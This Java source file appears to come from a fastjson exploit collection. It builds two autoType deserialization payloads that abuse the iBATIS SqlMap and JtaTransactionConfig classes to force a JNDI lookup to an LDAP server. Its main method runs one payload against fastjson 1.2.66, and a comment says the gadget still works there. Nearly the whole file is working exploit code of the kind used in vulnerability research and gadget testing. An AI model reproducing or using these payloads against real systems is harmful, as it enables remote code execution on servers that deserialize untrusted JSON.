package fastjsonExp;

import com.ibatis.db.sqlmap.SqlMap;
import com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig;
import utils.FastjsonVersionCtr;
import utils.StringUtils;


/**
 * 已完成
 * com.ibatis
 * still work at fastjson 1.2.66
 */
public class EXP4ibatis_sqlmap {

    //payload="{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://127.0.0.1:1389/run\"}}";
    //payload="{\"@type\":\"com.ibatis.db.sqlmap.SqlMap\",\"userTransactionJndiName\":\"ldap://127.0.0.1:1389/run\"}";

    public String JNDI_URL = "";
    public String payload1 = "{\"@type\":\"com.ibatis.db.sqlmap.SqlMap\",\"userTransactionJndiName\":\"replace_here\"}";
    public String payload2 = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"replace_here\"}}";

    public  void actual_fun_userTransactionJndiName(String url){
        SqlMap s = new SqlMap();
        s.setUserTransactionJndiName(url);
    }
    public  void actual_fun_userTransactionJndiName(){
        if(!StringUtils.isNull(this.JNDI_URL)){
            actual_fun_userTransactionJndiName(this.JNDI_URL);
        }
    }

    public  void actual_fun_JtaTransactionConfig(String url){

    }
    public  void actual_fun_JtaTransactionConfig(){

    }

    public EXP4ibatis_sqlmap(){}
    public EXP4ibatis_sqlmap(String uri){
        this.JNDI_URL = uri;
        this.payload1 = this.payload1.replace("replace_here",uri);
        this.payload2 = this.payload2.replace("replace_here",uri);
        System.out.println(this.payload1);
        System.out.println(this.payload2);
    }
    public String getPayload1(){
        return this.payload1;
    }
    public String getPayload2(){
        System.out.println(this.payload2);
        return this.payload2;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.66");
        myFastjson.mySetAutoType(true);
        EXP4ibatis_sqlmap exp = new EXP4ibatis_sqlmap("ldap://127.0.0.1:1389/run");
        //myFastjson.myParseObject(exp.getPayload1());
        myFastjson.myParseObject(exp.getPayload2());
        //exp.actual_fun_userTransactionJndiName();
        myFastjson.clear();

    }


}
